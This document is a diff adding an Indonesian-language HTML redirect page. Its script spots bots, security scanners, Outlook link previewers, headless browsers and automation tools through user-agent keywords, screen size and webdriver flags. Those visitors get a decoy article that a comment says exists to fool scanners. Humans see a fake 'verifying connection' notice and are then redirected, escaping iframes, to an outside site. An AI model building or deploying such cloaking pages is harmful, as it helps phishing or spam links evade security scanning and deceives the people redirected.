@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting to Secure Server...</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f7f9; color: #333; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0078d4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .container { text-align: center; padding: 20px; }
+        #bot-content { display: none; text-align: left; max-width: 600px; padding: 40px; background: white; }
+    </style>
+</head>
+<body>
+
+    <div id="human-ui" class="container">
+        <div class="loader"></div>
+        <p>Sedang mengalihkan ke server aman...</p>
+        <p style="font-size: 12px; color: #888;">Mohon tunggu sebentar, kami sedang memverifikasi koneksi Anda.</p>
+    </div>
+
+    <div id="bot-content">
+        <h1>Implementasi Microservices pada Infrastruktur Cloud</h1>
+        <p>Dalam era digital saat ini, arsitektur microservices menjadi standar utama bagi perusahaan skala besar...</p>
+        <p>Pengembangan menggunakan Docker dan Kubernetes memungkinkan skalabilitas yang lebih fleksibel dibandingkan monolitik...</p>
+        <p><em>(Konten ini sengaja ditampilkan agar bot pemindai menganggap link ini adalah artikel teknologi biasa)</em></p>
+    </div>
+
+    <script>
+        (function() {
+            // KONFIGURASI: Ganti dengan link tujuan Anda
+            var targetUrl = "https://nusaindahrp.com/?dev";
+            
+            // 1. Deteksi User-Agent (Penyaringan Bot Umum)
+            var ua = navigator.userAgent.toLowerCase();
+            var botKeywords = [
+                "bot", "spider", "crawler", "scanner", "headless", "ahrefs", "googleusercontent", 
+                "outlook-linkdetect", "preview", "monit", "slurp", "bingpreview", "ptst"
+            ];
+            var isBotUA = botKeywords.some(keyword => ua.indexOf(keyword) > -1);
+
+            // 2. Deteksi Screen Check (Deteksi Headless Browser)
+            // Manusia normal biasanya memiliki resolusi layar > 0
+            var isHeadless = (window.screen.width === 0 || window.screen.height === 0 || window.outerWidth === 0);
+
+            // 3. Deteksi Automation Tools (Selenium, Puppeteer, dll)
+            var isAutomated = navigator.webdriver || !!window.__webdriver_evaluate || !!window.__selenium_evaluate;
+
+            // LOGIKA FILTER
+            if (isBotUA || isHeadless || isAutomated) {
+                // JIKA TERDETEKSI BOT: Tampilkan konten palsu
+                document.getElementById("human-ui").style.display = "none";
+                document.getElementById("bot-content").style.display = "block";
+                console.log("Validation Failed: Bot detected.");
+            } else {
+                // JIKA MANUSIA: Berikan sedikit delay (1.5 detik) lalu redirect
+                setTimeout(function() {
+                    // Coba window.top dulu untuk menembus iframe jika ada
+                    try {
+                        if (window.top.location.href !== window.location.href) {
+                            window.top.location.replace(targetUrl);
+                        } else {
+                            window.location.replace(targetUrl);
+                        }
+                    } catch (e) {
+                        window.location.href = targetUrl;
+                    }
+                }, 1500); 
+            }
+        })();
+    </script>
+</body>
+</html>
